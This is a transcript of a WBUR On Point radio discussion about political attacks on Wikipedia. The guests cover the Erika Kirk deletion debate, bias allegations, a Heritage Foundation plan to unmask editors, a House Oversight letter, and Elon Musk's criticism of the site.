    &lt;p&gt;He's a freelance journalist who's covered Wikipedia for almost a decade, and also a tech lawyer as well. He is with us from Dallas, Texas. Stephen, welcome to On Point.&lt;/p&gt;
    &lt;p&gt;STEPHEN HARRISON: Hello, Meghna. Thanks for having me.&lt;/p&gt;
    &lt;p&gt;CHAKRABARTI: Okay, so I actually, I've got Wikipedia open here in front of me and I'm on the page for Erika Kirk.&lt;/p&gt;
    &lt;p&gt;And right now, that mark for deletion box is actually gone. It's not on the page today, which is Thursday, September 18, 10 a.m. Eastern time. Now it says the article is currently protected from editing. What does that mean?&lt;/p&gt;
    &lt;p&gt;HARRISON: So the article right now is what's called fully protected, and that means that only Wikipedia's volunteer administrators can edit it for the next two days until September 20th.&lt;/p&gt;
    &lt;p&gt;And the reason that was done is because there was some instances of vandalism and concerns about editing disputes. And if you click or scroll up to the top of the page, maybe about four tabs over, you can see the word "Talk" and that's where you can see the editorial discussion that's been taking place behind the scenes.&lt;/p&gt;
    &lt;p&gt;CHAKRABARTI: Okay, let's click on that. Talk ... Okay. So here it says the article was nominated for deletion on September 11th, 2025. Why did that happen?&lt;/p&gt;
    &lt;p&gt;HARRISON: One Wikipedia editor nominated Erika's article for deletion on the grounds that she wasn't what's called independently notable, that she had inherited her notability or her importance from her husband.&lt;/p&gt;
    &lt;p&gt;But one of the things that I think is not really covered in the Fox News framing of events. And I would say that the Fox News framing suggests that Wikipedia is trying to erase Charlie Kirk's widow, and there's the sort of insinuation is that Wikipedia editors are heartless, is trying to create a certain picture.&lt;/p&gt;
    &lt;p&gt;But in reality, the nomination of an article for deletion is very common. If your listeners tried to create a Wikipedia article right now, it would very likely be nominated for discussion, a deletion, and then there'd be a whole discussion among the editors about whether it should in fact be kept.&lt;/p&gt;
    &lt;p&gt;And so I think while there's a move to cast this as politically decisive, it's actually just really commonplace. And you can see if you scroll through the top page that a lot of the discussions were Wikipedia, based on policies like notability and whether there've been independent press coverage of Erika Kirk.&lt;/p&gt;
    &lt;p&gt;And a lot of the Wikipedia editors just scrolling through the top page, you can see they're expressing their sympathy and remorse for the horrible tragedy that Erika went through. And I think ultimately what's interesting about it is the Fox News piece was talking about deleting Erika Kirk from Wikipedia.&lt;/p&gt;
    &lt;p&gt;Not only was she not deleted, she was kept. And if you review the discussion, about 150 Wikipedia editors participated and they decided by a margin of four to one to keep her page. And so she will remain on Wikipedia.&lt;/p&gt;
    &lt;p&gt;CHAKRABARTI: It's interesting though, because as you just said, there's this consensus emerged around whether or not a person is independently notable.&lt;/p&gt;
    &lt;p&gt;What are the criteria for that?&lt;/p&gt;
    &lt;p&gt;HARRISON: Regardless of where it is, Erika Kirk's going to appear on Wikipedia in some form. It's a question of whether she's part of Charlie Kirk's Wikipedia page or if she has significant coverage as shown by media sources to have her own page, like a profile of her, specifically.&lt;/p&gt;
    &lt;p&gt;And one of the things that the editors point to in the discussion is that the press coverage of Erika had really gone up since Charlie Kirk's assassination, right? And so that changing media environment also influenced the Wikipedia discussion, and the Wikipedia editors go where the sources go.&lt;/p&gt;
    &lt;p&gt;And that's why it was decided that her page was independently notable and that it should be kept.&lt;/p&gt;
    &lt;p&gt;CHAKRABARTI: I have to say, the disagreement over what to do about the page, it is right there. If you just click on Talk, you, anyone can look at it. Pretty robust. And I think it's worth going into just a little bit more detail, Stephen, because the discussion that these editors themselves are having over the page tells us a lot about some of the basis whether fact or fiction of the critics of, or the criticisms of Wikipedia.&lt;/p&gt;
    &lt;p&gt;Like for example, as you said, there is an editor who says: Please pay respect to her. She lost her husband today. She deserves a Wikipedia article. The very next comment from another editor says: Losing a husband is not a reason to get a person a Wikipedia page, nor is a Wikipedia page a show of respect.&lt;/p&gt;
    &lt;p&gt;And then another person, another editor, comes in and says: Pay respect to the wife of a white supremacist. And then someone else then comes in and adds: Why does his ideology, is it valid in that? And then a third person comes in and says: Oh, there we have Wikipedia's cancel culture at work.&lt;/p&gt;
    &lt;p&gt;No respect for someone because of his adversarial thoughts, and therefore no respect for the wife of the person murdered. And then it goes into: She does have plenty of qualifiers for notoriety before her marriage to Charlie Kirk, et cetera, et cetera. And it goes on to the consensus that emerges, that you said, that people then say, 1, 2, 3, 4, at least five editors say, I agree that she should have her own page.&lt;/p&gt;
    &lt;p&gt;There's a lot of independent reasons and independent resources mentioning her, et cetera. She should have it. What does the tone of that conversation tell you about how decisions are made for Wikipedia pages, Stephen?&lt;/p&gt;
    &lt;p&gt;HARRISON: I think first and foremost is that the discussions are transparent.&lt;/p&gt;
    &lt;p&gt;Like you said, you can click through, and you can see everything and it's on the record. And so I think that's helpful. It's not happening in some back room somewhere in Washington. You can see it on Wikipedia. I do think that as with a lot of things in our society, there's a trauma and from looking at those comments, I saw some sort of trauma expressed.&lt;/p&gt;
    &lt;p&gt;In the back and forth among the editors, as you said, a consensus emerges. And I think that some of the Wikipedia editors who chimed in there may not typically contribute all that much to Wikipedia, when it became a story and got picked up as a story, that probably drove editors who might not normally participate in what's called an AfD article for deletion discussion to contribute to the page.&lt;/p&gt;
    &lt;p&gt;And sometimes that's referred to as canvassing. But again, what the administrator did is he looked at the entirety of the arguments and not just from a numbers perspective, but just who is making arguments based on Wikipedia policy and not just the political or cultural points that were raised. Who's making the best arguments based on policy? And decided that, on those merits, Erika Kirk should have a page. And for example, she was Miss Arizona in 2012, I believe. Like she had some independent notability.&lt;/p&gt;
    &lt;p&gt;So I think of course, while there is a lot of passion that comes into these things, I think the ultimate decision, when Wikipedia works and it doesn't always work, but when Wikipedia is working well, it is based on the policies of the site like notability.&lt;/p&gt;
    &lt;p&gt;CHAKRABARTI: What I find most interesting is, not only do they come to the conclusion that because Erika Kirk both in relationship to her marriage to Charlie Kirk, and also her own independent standing is notable enough to deserve her page to be kept up and not deleted. But as we mentioned, you see a lot of conversation here about the Wikipedia editor's own conscientiousness about the criticisms of Wikipedia. We mentioned someone saying there's Wikipedia's cancel culture at work.&lt;/p&gt;
    &lt;p&gt;Someone says she's a notable person who deserves her own page. If this is deleted, it's going to be seen as a political move. Someone else says, Wikipedia is seen as elitist. All of these criticisms that the Wikipedia editors know of are coming from now very powerful right-wing groups such as the Heritage Foundation and even the House Oversight Committee.&lt;/p&gt;
    &lt;p&gt;We'll talk about that in a second. But I want to actually just give voice to how the criticisms are discussed in popular media. This is conservative commentator Steven Crowder, who has accused Wikipedia of bias. Here's Crowder on his show Louder with Crowder a couple of years ago, January 2022.&lt;/p&gt;
    &lt;p&gt;CROWDER: What's scary is when you have a very small group of people who are forming a consensus, and then they are saying, no opposing point of view from outside of our consensus is allowed, because we've already achieved consensus. This is the most terrifying response you can get. Because that's a response that can be used for anything, and it's a response that Wikipedia, or in another case, Facebook, YouTube, Google, Alphabet could use for any issue.&lt;/p&gt;
    &lt;p&gt;CHAKRABARTI: That's again, once again, Steven Crowder there. Stephen Harrison, we have about a minute before our first break. Earlier this year, the Heritage Foundation said it would quote, identify and target Wikipedia editors. It accuses of bias. Tell me more about that.&lt;/p&gt;
    &lt;p&gt;HARRISON: Yeah, this is really, was very unusual and I think it really sprang from some concerns about how Wikipedia was describing the Israel and Palestine conflict. And I did see this as very much an escalation, because instead of engaging with the Wikipedia arguments about how a particular subject should be reflected on the site, the Heritage Foundation said that they'd use tools like identifying username and certain textiles to try to figure out who these people were as editors and try to identify them and punish them personally as opposed to debating them on Wikipedia. So that was, I would say, a pretty dangerous escalation.&lt;/p&gt;
    &lt;p&gt;Support WBUR&lt;/p&gt;
    &lt;p&gt;Part II&lt;/p&gt;
    &lt;p&gt;CHAKRABARTI: I also just want to note specifically that we did reach out to the Heritage Foundation requesting an interview. They declined, but a Heritage Foundation spokesman told us via email quote: Targeting Wikipedia editors would require publicizing the information.&lt;/p&gt;
    &lt;p&gt;And the foundation has not posted anything of the sort. However, the statement goes on: If you're writing about Wikipedia's left-wing bias, I hope you report that some of the site's ghoulish editors propose deleting the page for Erika Kirk within days of her husband's assassination. End quote. With Stephen in the first part of the conversation, we did just that.&lt;/p&gt;
    &lt;p&gt;We forensically went through the process of the conversation that was happening with Wikipedia editors there. And again, On Point listeners, I encourage you to go to wikipedia.org. Look up Erika Kirk's name, and as Stephen said, in the upper left hand corner of the page, you will see a little button that says, or a little place to click that says, Talk.&lt;/p&gt;
    &lt;p&gt;Click on that, and you too can see the entirety of the conversation that happened around Erika Kirk's page. Stephen also mentioned a lot of controversy over Wikipedia entries about Israel and Gaza. Let's listen to some of that criticism. This is Rabbi Pesach Wolicki, an Orthodox Jewish leader who's been critical of Wikipedia on social media.&lt;/p&gt;
    &lt;p&gt;Here's that.&lt;/p&gt;
    &lt;p&gt;RABBI PESACH WOLICKI: Most Wikipedia pages are open source. You can go in and edit them. You can add information, you could add other sources. But this Wikipedia page is locked. It is impossible to edit. There's no way to change this page that claims falsely that Israel has killed Gazans at the aid distribution sites.&lt;/p&gt;
    &lt;p&gt;CHAKRABARTI: Okay, and here's another one. This is writer Ashley Rindsberg. And Rindsberg has claimed a group of around 40 Wikipedia editors orchestrated a campaign to quote de-legitimize Israel. Present radical Islamist groups in a favorable light and position fringe academic views on the Israel-Palestine conflict as mainstream, end quote.&lt;/p&gt;
    &lt;p&gt;Rindsberg explained in an interview with the Atlas Society, November 2024.&lt;/p&gt;
    &lt;p&gt;ASHLEY RINDSBERG: They made something like 850,000 edits across nearly 10,000 articles in the Israel-Palestine space. Things like downplaying allegations of rape, or even removing allegations of rape on October 7th.&lt;/p&gt;
    &lt;p&gt;They were whitewashing Hezbollah, and they were also making a very concerted effort to sever any ties between the Jewish people in Israel in hundreds of articles. So the idea there would be to delegitimize Israel and try to show that the Jewish people don't really have any place in Israel whatsoever, because all this stuff ends up on the front page of Google, not just the front page, but the top result.&lt;/p&gt;
    &lt;p&gt;Millions and millions of people around the world are absorbing a perspective that is actually tied back to groups of radical editors.&lt;/p&gt;
    &lt;p&gt;Once again, that's writer Ashley Rindsberg. Joining us now is Molly White. Molly has been a Wikipedia editor for around 20 years. Molly, welcome to On Point.&lt;/p&gt;
    &lt;p&gt;MOLLY WHITE: Hi, Meghna. Thank you for having me.&lt;/p&gt;
    &lt;p&gt;CHAKRABARTI: I just also want to note that we did reach out directly to the Wikimedia Foundation, that's the nonprofit that operates Wikipedia. We requested an interview. The foundation declined our request, but Molly independently agreed. So first of all, Molly, let's just tackle this controversy over Wikipedia entries on Israel and Gaza. You heard there the allegation that very deliberately Wikipedia editors are trying to shape a narrative around this, that supporters of Israel, very vociferously, disagree with.&lt;/p&gt;
    &lt;p&gt;WHITE: With Wikipedia and its volunteer editors, there are always issues around editors trying to insert viewpoints into articles or highlight specific viewpoints that they may hold.&lt;/p&gt;
    &lt;p&gt;And the Wikimedia editing community is always working very hard to try to ensure that articles stay balanced when it comes to perspectives. And that means not necessarily choosing which version of events is correct, but representing all viewpoints in proportion to their prominence in reliable sources.&lt;/p&gt;
    &lt;quote&gt;&lt;p&gt;The Wikimedia editing community is always working very hard to try to ensure that articles stay balanced when it comes to perspectives.&lt;/p&gt;Molly White&lt;/quote&gt;
    &lt;p&gt;And when it comes to highly contentious topic areas like Israel and Palestine, that can be very challenging. But the Wikimedia editing community has been dealing with issues of bias in these editing areas for years, and when there have been allegations of editors trying to push viewpoints that are not appropriate in terms of bias or accuracy or sourcing, those are handled by the editing community fairly comprehensively.&lt;/p&gt;
    &lt;p&gt;CHAKRABARTI: How?&lt;/p&gt;
    &lt;p&gt;WHITE: It can range dramatically from individual editors working things out on article Talk pages. Stephen explained to you earlier. There are broader community discussions if there is a more serious conflict that's happening, all the way up to what's known as the arbitration committee on Wikipedia, which is the last resort for some of the most intractable disputes among editors or behavior that violates Wikipedia policies.&lt;/p&gt;
    &lt;p&gt;And there have been multiple arbitration cases dealing with the issue of Israel-Palestine that have resulted in various outcomes, including limiting which editors can edit those pages directly.&lt;/p&gt;
    &lt;p&gt;And removing editors from the topic area if they were determined to have violated Wikipedia policy on any side of the issue.&lt;/p&gt;
    &lt;p&gt;CHAKRABARTI: What's interesting is, Molly, many now critics of Wikipedia are pointing to exactly that process that you just outlined as one of the reasons why they think bias emerges on Wikipedia pages, because it's no longer what, Wikipedia is no longer what it once was at its founding, where just about anybody can just jump in and change a page.&lt;/p&gt;
    &lt;p&gt;So let's listen once again to Ashley Rindsberg. You heard him before. He says in his opinion, the site's bureaucracy and what he calls quote, almost parliamentarian rules make it hard for an average person to make an edit. And this again, is from a 2024 interview with the Atlas Society.&lt;/p&gt;
    &lt;p&gt;ASHLEY RINDSBERG: Wikipedia is a bureaucracy in many ways, a lot of procedures, and there's a lot of rules to be followed, and there's a lot of committees that have to be consulted for things to get to a point where a decision is actually made, things can take a lot of time.&lt;/p&gt;
    &lt;p&gt;And when you have that kind of bottleneck, especially when we're dealing with a website that has nearly 7 million articles on it, you're just naturally going to have to restrict what can be decided upon. There is just only so much that the arbitrators can handle, and this is what we're seeing today, is how we got here.&lt;/p&gt;
    &lt;p&gt;CHAKRABARTI: Molly, how do you respond to that?&lt;/p&gt;
    &lt;p&gt;WHITE: I think there are some legitimate criticisms there. It is more challenging to edit Wikipedia these days than it once was, because of the policies and processes that exist. That can be a bit of a burden for a new editor to understand.&lt;/p&gt;
    &lt;quote&gt;&lt;p&gt;It is more challenging to edit Wikipedia these days than it once was, because of the policies and processes that exist.&lt;/p&gt;Molly White&lt;/quote&gt;
    &lt;p&gt;But ultimately, I think that you can't have it both ways. There are people who are like Ashley Rindsberg, criticizing Wikipedia for not doing enough and not instituting enough policies and community intervention to shape content the way they believe it needs to be. While also criticizing Wikipedia for having too many policies and too much oversight.&lt;/p&gt;
    &lt;p&gt;I don't understand how you can have it both ways.&lt;/p&gt;
    &lt;p&gt;CHAKRABARTI: Okay. Molly and Stephen, let's return back to the latest push now against Wikipedia, again, from very prominent right-wing groups like the Heritage Foundation and the House Oversight Committee, the Republican members thereof. We'll talk about the House in just a second.&lt;/p&gt;
    &lt;p&gt;But I want to note that, again, the Heritage Foundation did not agree to speak with us on the air, but the spokesman I quoted earlier referred us to an organization called The Oversight Project.&lt;/p&gt;
    &lt;p&gt;Now, the Oversight Project did not respond to our request for an interview, but publicly available online there is a PDF, a PowerPoint PDF version of a PowerPoint presentation. You can find it easily online, and it's called Wikipedia Editor Targeting from the Oversight Project and the Heritage Foundation.&lt;/p&gt;
    &lt;p&gt;And it says, identify and target Wikipedia editors abusing their position by analyzing, this is how they're going to identify editors, text patterns, usernames, technical data through data breach analysis, fingerprinting, human intelligence and technical targeting. Which includes things like cross article comparisons, behavioral patterns online, historical comparisons. They're really deploying a lot of tools to identify who Wikipedia editors are.&lt;/p&gt;
    &lt;p&gt;Molly, first of all, and then Stephen, I promise I'll come back to you.&lt;/p&gt;
    &lt;p&gt;Tell me, has this had an any kind of impact on you already?&lt;/p&gt;
    &lt;p&gt;WHITE: Personally, not so much just because I am very public about who I am. It's no difficulty to identify my real-life identity, but I would say these types of threats have a dramatic chilling effect on the volunteer editing community. These are people who are volunteering their time to try to improve this public resource. They're not being compensated for it. They are taking time out of their day and now they are facing this threat that an extremely aggressive, politically extreme organization is going to paint a target on your back for participating in this project.&lt;/p&gt;
    &lt;p&gt;And we've seen the damage and sort of chaos that can be introduced to people's lives when they're publicly targeted by groups like the Heritage Foundation. And I worry that our volunteer editing community, members of that community will see this and say, you know what? It's not worth it. I don't have the capacity to put up with these types of threats.&lt;/p&gt;
    &lt;p&gt;Even if I'm not editing in those topic areas. The definition that The Heritage Foundation employed, just the vague idea of abusive editors. It's so vague as to encompass just about anybody. I think ultimately these types of threats have a dramatic chilling effect on our editing community, regardless of whether or not they follow through or whether or not editors are ultimately broadly being targeted.&lt;/p&gt;
    &lt;quote&gt;&lt;p&gt;Ultimately these types of threats have a dramatic chilling effect on our editing community, regardless of whether or not they follow through or whether or not editors are ultimately broadly being targeted.&lt;/p&gt;Molly White&lt;/quote&gt;
    &lt;p&gt;CHAKRABARTI: Stephen Harrison, this document says it discusses doing things like creating sock puppet accounts that would, quote: reveal patterns and provoke reactions from editors. It also talks about using geolocation. I mentioned searching through hacked databases for things like username reuses, and also even going so far as using facial recognition software to learn the real identities of Wikipedia editors.&lt;/p&gt;
    &lt;p&gt;Again, the Heritage Foundation would not speak to us, but Stephen, have you been able to determine any more of what the Heritage Foundation intends to do with this information if it finds it?&lt;/p&gt;
    &lt;p&gt;HARRISON: Yeah. It's so interesting because I wrote about this idea of going after the editors in my book called The Editors.&lt;/p&gt;
    &lt;p&gt;And I think that they also talked about social engineering, the idea that if you could try to trick volunteer editors into revealing personal information about themselves, that might be another opportunity to get at them. I think, I mean, we have to address the irony that this is harassment and cancel culture and you would think that the Heritage Foundation, which has been so against that idea would be against it here.&lt;/p&gt;
    &lt;p&gt;But of course, it's exactly that. And I have seen in China, it reminds me of how some of the Wikipedia editors in mainland China use these tools, tools that were able to look at IP addresses, in order to intimidate Wikipedia editors who are based in Hong Kong. This was at the time of the Hong Kong protests.&lt;/p&gt;
    &lt;p&gt;And so it seems like this is taking a tactic from other authoritarian regimes and putting the safety of Wikipedia volunteers at risk.&lt;/p&gt;
    &lt;p&gt;CHAKRABARTI: Molly, did you want to add to that?&lt;/p&gt;
    &lt;p&gt;WHITE: I think that's absolutely right. This is ultimately a extremely chilling, type of behavior. And for an organization and a sort of political group that claims to be pro-free speech, pro-free expression, anti-censorship, it is deeply ironic that they are now doing exactly what they condemn.&lt;/p&gt;
    &lt;p&gt;CHAKRABARTI: Now, let's talk about how these criticisms and the targeting that's coming from, let's say, advocacy groups like Heritage is now bleeding into the United States Congress.&lt;/p&gt;
    &lt;p&gt;Because on August 27th, so just a couple of weeks ago, the House Oversight Committee sent a letter to Wikipedia's CEO, saying that the, quote:&lt;/p&gt;
    &lt;quote&gt;
      &lt;p&gt;Committee on Oversight and Government Reform is investigating the efforts of foreign operations and individuals at academic institutions subsidized by U.S. taxpayer dollars to influence U.S. public opinion.&lt;/p&gt;
    &lt;/quote&gt;
    &lt;p&gt;And the Committee says:&lt;/p&gt;
    &lt;quote&gt;
      &lt;p&gt;We seek your assistance in obtaining documents and communications regarding individuals or specific accounts serving as Wikipedia volunteer editors who violated Wikipedia platform policies, as well as your own efforts to thwart intentional organized efforts to inject bias into important and sensitive topics.&lt;/p&gt;
    &lt;/quote&gt;
    &lt;p&gt;That's the first graph there. Stephen, first of all, and then Molly, I'm going to hear from you on this, but the House is trying to use its leverage over U.S. taxpayer dollars going to American colleges and universities. But I'm not quite sure how that works if Wikipedia itself doesn't directly receive funding.&lt;/p&gt;
    &lt;p&gt;Do you want to talk about this letter a little bit?&lt;/p&gt;
    &lt;p&gt;HARRISON: Yeah. I think, I mean they mentioned in the letter efforts by foreign operatives as to what sway U.S. opinion. And I would say if that's in fact happening, I would want to know that, if there's efforts by puppet farms in Russia or China to influence what's on Wikipedia.&lt;/p&gt;
    &lt;p&gt;But I think that what we have here is, it's just against this background of conservative criticism. And I think within the same week, Mike Lee tweeted something inflammatory, like the editors are putting the wicked in Wikipedia, right? We know where they're coming from in this position, right?&lt;/p&gt;
    &lt;p&gt;And so I think that there's a lot of concern, I think justifiably, that it doesn't really feel like oversight from the committee. It feels more like targeting.&lt;/p&gt;
    &lt;p&gt;CHAKRABARTI: Molly, your thoughts.&lt;/p&gt;
    &lt;p&gt;WHITE: I would agree with that. And, ultimately Congress does not have constitutional authority to investigate a website like Wikipedia for editorial decisions.&lt;/p&gt;
    &lt;p&gt;That is basic First Amendment stuff. And it is somewhat absurd to see the Oversight Committee, claiming to be evaluating whether editors are following Wikipedia policy. That is not their domain. But I do think that this is ultimately of a kind with the similar intimidation tactics that we're seeing from Heritage and other groups. Because there were demands for private information about editor disputes and identifying information about editors, including private logs of their IP addresses.&lt;/p&gt;
    &lt;p&gt;This is really, I think, just intensifying concern among Wikipedia editors that not only might the Heritage Foundation or some advocacy group target you for your volunteer editing activities, but you might even have members of Congress who have been willing to engage in similar behavior, to publicly identify and target people they view as politically opposed.&lt;/p&gt;
    &lt;p&gt;CHAKRABARTI: This also comes at the same time as we've seen multiple lawsuits, for example, filed by President Donald Trump against media organizations.&lt;/p&gt;
    &lt;p&gt;The latest is a $15 billion lawsuit filed this week against the New York Times.&lt;/p&gt;
    &lt;p&gt;Part III&lt;/p&gt;
    &lt;p&gt;CHAKRABARTI: Let's listen to some competing views here from some of the earliest voices from Wikipedia, Larry Sanger helped start the site. He left Wikipedia in 2002. Since then, he has frequently criticized the website for, in his view, being too left wing. Here he is doing an interview on Glenn Greenwald's show System Update, August 2023.&lt;/p&gt;
    &lt;p&gt;LARRY SANGER: When it shifted from the neutral point of view to a, I guess I would call it a scientistic point of view, any sort of controversial issues in science, the establishment view on that topic was pushed very heavily. That happened like in, I don't know, 2006, 2008, by, at the time, Trump became president. Yeah. It was almost as bad it as it is now. It's amazing. No encyclopedia to my knowledge, has been as biased as Wikipedia has been.&lt;/p&gt;
    &lt;p&gt;CHAKRABARTI: Here's a different view.&lt;/p&gt;
    &lt;p&gt;Wikipedia co-founder Jimmy Wales was on the Lex Fridman Podcast in June of 2023, so that same summer. And Fridman asked whether Wales thinks the site has a left-leaning political bias.&lt;/p&gt;
    &lt;p&gt;JIMMY WALES: I don't think so, not broadly, I think you can always point to specific entries and talk about specific biases, but that's part of the process of Wikipedia.&lt;/p&gt;
    &lt;p&gt;Anyone can come and challenge and to go on about that. It's certainly true that some people who have quite fringe viewpoints and who knows the full rush of history, in 500 years, they might be considered to be pathbreaking geniuses, but at the moment, quite fringe views, and they're just unhappy that Wikipedia doesn't report on their fringe views as being mainstream.&lt;/p&gt;
    &lt;p&gt;CHAKRABARTI: That's Wikipedia co-founder Jimmy Wales. Molly, I want to talk with you about some of your own reporting and editing on Wikipedia, specifically regarding Elon Musk. But before that, a quick question here. This idea of mainstream or reliable resources, reliable sources as being one of the criteria of whether information makes it onto Wikipedia.&lt;/p&gt;
    &lt;p&gt;Isn't that right there? This is a criticism I hear of NPR all the time, or public radio, like it's just subject to bias based on what you consider to be mainstream or reliable. Does that same, could that same bias not apply to Wikipedia?&lt;/p&gt;
    &lt;p&gt;WHITE: I think that's true. There is the possibility that bias in sources may be reflected on Wikipedia.&lt;/p&gt;
    &lt;p&gt;And this is something we've grappled with for a very long time as a project. Because, for example, if women or people of color, underrepresented in historical texts, then they are going to necessarily be underrepresented on Wikipedia, or sources that rely on that. The same thing is true of communities that rely on oral histories, which are very challenging to cite.&lt;/p&gt;
    &lt;p&gt;So I think there are very serious concerns around if material that should be included in Wikipedia is not being included. But ultimately, I don't think that the serious concerns there are really in the area of right-wing American politics. There is no shortage of coverage of even very extreme or fringe views.&lt;/p&gt;
    &lt;quote&gt;&lt;p&gt;There is no shortage of coverage of even very extreme or fringe views [on Wikipedia].&lt;/p&gt;Molly White&lt;/quote&gt;
    &lt;p&gt;And if there is coverage, Wikipedia will describe that. That is why Wikipedia describes things like the flat earth conspiracy theory, right? It is not accepted science, but if it is described in reliable sources, it will also be described as a fringe theory in Wikipedia.&lt;/p&gt;
    &lt;p&gt;I think ultimately the complaint is that these fringe theories are not being treated as equivalent to the accepted science, and that is the type of complaint we've heard a lot of from Larry Sanger, who has been very vocal about his belief that very fringe theories should be treated with the same weight as mainstream scientific consensus.&lt;/p&gt;
    &lt;p&gt;CHAKRABARTI: Stephen, I wonder if part of how we arrived here has to do with how Wikipedia has actually become a very important source of information for a ton of people. And that sort of, in a sense, is ironically in opposition to the founding idea of Wikipedia, that it's this open online encyclopedia where, you know, anybody could edit or add information.&lt;/p&gt;
    &lt;p&gt;And through the sort of wonderful chaos of the masses coming together, the belief was that any and every idea should get equal weight. If that was the case, I don't think Wikipedia would've become so important to so many people as a reliable source.&lt;/p&gt;
    &lt;p&gt;And in fact, because things are not getting equal weight, and as Molly's describing, some sources are considered more reliable than other, Wikipedia has become even more way more popular. And you heard critics earlier say it's also showing up on like page one of Google searches, at the top.&lt;/p&gt;
    &lt;p&gt;So the thing that's made it successful is exactly the same thing that's led to the current, like, very intense criticism of it.&lt;/p&gt;
    &lt;p&gt;HARRISON: I think that's right. I think we have a beginning and the middle to the story, and we might be figuring out the end. And by beginning, I mean in the early days there were all these concerns about Wikipedia being authorial anarchy, and Stephen Colbert used the word Wikiality, and the idea was you can't trust this.&lt;/p&gt;
    &lt;p&gt;How could you possibly trust the encyclopedia? That quote, anybody can write. Maybe around 2015 there were a lot of observations, and I should say from both sides of the political spectrum that wow, Wikipedia is working pretty well. And I think the idea was that there's so many eyes on the project and that's what's making it better, that just having this visibility and like people editing and more contributions makes it better.&lt;/p&gt;
    &lt;p&gt;And Elon Musk, who as you said, is now a big critic of Wikipedia, but in 2017, he said Wikipedia is great. It keeps getting better and better. So he liked it back then. And then now, 2025, we have this, concerns about political bias. We have, I think a lot of the urgency of the arguments comes from the fact that Wikipedia articles appear in Google search results and in AI summaries so much.&lt;/p&gt;
    &lt;p&gt;And so they're very prevalent, and I think that's why there's a lot of discussion now about, okay when Wikipedia editors decide what is a reliable source. What are they choosing from? Does that mean mainstream media, reliable source? Does that mean excluding or not putting as much weight on fringe sources. And so I think that's why we're in this point, in terms of what sources are represented and mirrored on Wikipedia.&lt;/p&gt;
    &lt;p&gt;CHAKRABARTI: Molly, let me just follow up with you on that. Does Wikipedia, do Wikipedia editors consider stories that have shown up on The Daily Wire, on Fox News, things like that, as reliable sources as well?&lt;/p&gt;
    &lt;p&gt;WHITE: It's a little bit complicated, but Wikipedia editors, broadly speaking, evaluate every source on a case-by-case basis, which, as you can imagine, can become very time consuming and repetitive if there are very prominent publications that are being discussed over and over again.&lt;/p&gt;
    &lt;p&gt;And so there have been larger discussions about, generally speaking, is this publication usually reliable, usually unreliable, or does it need to be treated with caution in some subject areas but not others? And those are the types of conversations that Wikipedia editors have had about a broad range of sources, including sources that are on the political right, like Fox News, the Daily Wire, sources that are probably perceived as more centrist and then of course left-wing sources. And there have been concerns about the general reliability of sources like Fox News, which has resulted in a guideline that these sources need to be treated with caution.&lt;/p&gt;
    &lt;p&gt;And the reliability is generally not up to Wikipedia standards. This has been portrayed as Wikipedia banning these sources in the past. You'll often see claims that Wikipedia has banned Fox News or the New York Post or some publication like that.&lt;/p&gt;
    &lt;p&gt;That's not accurate, but, like I said, these sources are treated on a case-by-case basis and you can search Wikipedia and you will see citations to Fox News and to the New York Post. Ultimately, we are very cautious about sources that have a reputation for poor fact checking or for publishing tabloid like material.&lt;/p&gt;
    &lt;p&gt;CHAKRABARTI: Let's talk for a second about Elon Musk. You've written quite extensively, Molly, about Elon Musk's now targeting of Wikipedia. But way back in December, the end of December of last year, he tweeted, quote: Stop donating to Wokepedia as he called it. He's also been training Grok, the AI chatbot run by Musk's Company xAI. He's been training Grok to fact check what he calls bias sources on the internet like Wikipedia, and he explained the training process at an event hosted by the podcast All-In. All-In's hosts have been critical of Wikipedia.&lt;/p&gt;
    &lt;p&gt;ELON MUSK: Grok is using heavy amounts of inference, compute, let's say, to look at, as an example, a Wikipedia page and say, what is true, partially true or false or missing in this page? Now rewrite the page to remove the falsehoods. Correct the half-truths and add the missing context.&lt;/p&gt;
    &lt;p&gt;CHAKRABARTI: Interesting. Musk there saying that he'd ask Grok to rewrite and to include things that are actual truths, he says, or to remove falsehoods. Molly, what has Musk's sort of criticism been of Wikipedia and the actions, more about the actions he's taken against it.&lt;/p&gt;
    &lt;p&gt;WHITE: I think you heard an allusion to it there, which is that a lot of these grievances come from people who are upset that they personally are not being described as they might like on their Wikipedia pages.&lt;/p&gt;
    &lt;p&gt;And I think ultimately that's actually where a lot of Elon Musk's own criticisms came from. He, as Stephen alluded to early on, was very complimentary about Wikipedia. He said, I love Wikipedia. But over time he began to complain about how his own article discussed him. He was upset that it didn't describe him as a founder of Tesla because he wasn't a founder of Tesla, but he wishes to be described as such.&lt;/p&gt;
    &lt;p&gt;And that I think ultimately morphed into his embrace of much broader complaints about Wikipedia as a biased source or as one that does not give enough attention and weight to more fringe sources like he might wish it to. And that has really turned into this campaign by Musk against Wikipedia, where he has encouraged people not to donate or use the site at all.&lt;/p&gt;
    &lt;p&gt;He has tried to suggest creating alternatives to Wikipedia and has ultimately been very aggressive against Wikipedia as an organization.&lt;/p&gt;
    &lt;p&gt;CHAKRABARTI: He has the money. He has the power, the information influence through X, formerly Twitter. And the U.S. Congress also has the power vis-a-vis the government to make life very miserable for Wikipedia.&lt;/p&gt;
    &lt;p&gt;Just these groups have for other media organizations. I also want to just point out that we did reach out to all 26 Republican members of the U.S. House Oversight Committee requesting interviews. Six of them directly declined. The rest did not respond. Okay. In the last few minutes of the conversation, Stephen, I wanna turn back to something you said earlier about a pattern that we've seen internationally in terms of, and now in the United States, in terms of going after independent sources of information.&lt;/p&gt;
    &lt;p&gt;Rachel Goodman says the attacks on Wikipedia do indeed fit into that pattern, the authoritarian's playbook. She's special counsel and team manager for free expression and the right to dissent at Protect Democracy.&lt;/p&gt;
    &lt;p&gt;RACHEL GOODMAN: Authoritarians seek to systematically dismantle independent sources of fact-based information.&lt;/p&gt;
    &lt;p&gt;When you control the narrative, you control power. The authoritarian playbook is straightforward here. Neutralize any institution that might contradict your version of reality.&lt;/p&gt;
    &lt;p&gt;CHAKRABARTI: And Goodman says, agreeing on what's true is essential for a functioning democracy.&lt;/p&gt;
    &lt;p&gt;GOODMAN: Democracy needs a shared foundation of truth.&lt;/p&gt;
    &lt;p&gt;And we as Americans can disagree on solutions. We should, but if we can't agree on basic facts, we can't self-govern. And that is what authoritarians count on. When independent voices are silenced, only one story remains: their story.&lt;/p&gt;
    &lt;quote&gt;&lt;p&gt;If we can't agree on basic facts, we can't self-govern. And that is what authoritarians count on.&lt;/p&gt;Rachel Goodman&lt;/quote&gt;
    &lt;p&gt;CHAKRABARTI: That's Rachel Goodman. She is special counsel for free expression and the right to dissent at Protect Democracy.&lt;/p&gt;
